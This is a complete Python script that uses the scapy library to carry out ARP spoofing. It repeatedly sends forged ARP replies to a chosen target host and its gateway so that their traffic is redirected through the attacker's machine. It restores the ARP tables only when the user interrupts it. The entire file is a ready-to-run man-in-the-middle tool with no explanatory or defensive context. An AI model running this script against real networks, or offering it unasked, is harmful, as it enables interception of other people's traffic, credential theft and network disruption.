#!/usr/bin/env python3

import optparse
import scapy.all as scapy
import time                                                                     

def get_arguements():
    # Parse the arguements from command line
    parser = optparse.OptionParser()                                            
    parser.add_option("-t", "--target", dest="target", help="Target IP Address")
    parser.add_option("-g","--gateway",dest="gateway", help="Gateway IP Address")    
    parser.add_option("-i","--interface",dest="interface",help="Interface to be Used")
    options=parser.parse_args() [0]                                   

    # checks necessary options are provided 
    if not options.interface:
        parser.error("[-]Please specify an interface,use --help for more info")
    elif not options.target:
        parser.error("[-]Please specify a target,use --help for more info")
    elif not options.gateway:
        parser.error("[-]Please specify a spoof/gateway,use --help for more info")
    return options


def restore_mac(target_ip,spoofed_ip,interface):
    # Restores the arp tables of gateway and target 
    spoofed_mac=get_mac(spoofed_ip,interface)
    target_mac=get_mac(target_ip,interface)
    packet =scapy.ARP(op=2,psrc=target_ip,hwsrc=target_mac,pdst=spoofed_ip,hwdst=spoofed_mac)
    scapy.send(packet,verbose=False)


def spoof(target_ip,spoofed_ip,interface):
    # Sends the arp response to the target 
    target_mac = get_mac(target_ip,interface)
    packet = scapy.ARP(op=2, psrc=spoofed_ip, pdst=target_ip, hwdst=target_mac)                 # op=2 is for response and 1 for request
    scapy.send(packet,verbose=False)                                               


def get_mac(ip,interface):
    # Get the mac address of the target
    arp_request=scapy.ARP(pdst=ip)                                                              #for creating arp packet
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                                              #for creating broadcast packet
    arp_request_broadcast=broadcast/arp_request                                                 #appending both packets
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,iface=interface,verbose=False) [0]   
    if answered_list:                                                                           #[0]is used to give onlu answered list
        return answered_list[0][1].hwsrc                                                        #returns only required mac
    else:
       check= input("[-]"+"Unable to locate the TARGET in the NETWORK\n SEARCH again.....[y/n]")
       if check == 'y':
           get_mac(ip,interface)
       else:
           exit()


# main code
options=get_arguements()
target_ip=options.target
gateway_ip=options.gateway
interface=options.interface

send_packets_count=0                                                            

try:
    while True:                                                                       
        spoof(target_ip, gateway_ip,interface)                                                 #spoof the target
        spoof(gateway_ip,target_ip,interface)                                                  #spoof the gateway
        send_packets_count+=2
        print("\r[+]Packets count "+ str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+]Detected Ctrl+C....Restoring ARP Tables ........Please wait")
    restore_mac(target_ip,gateway_ip,interface)
    restore_mac(gateway_ip,target_ip,interface)
except Exception as error:
    print(error)

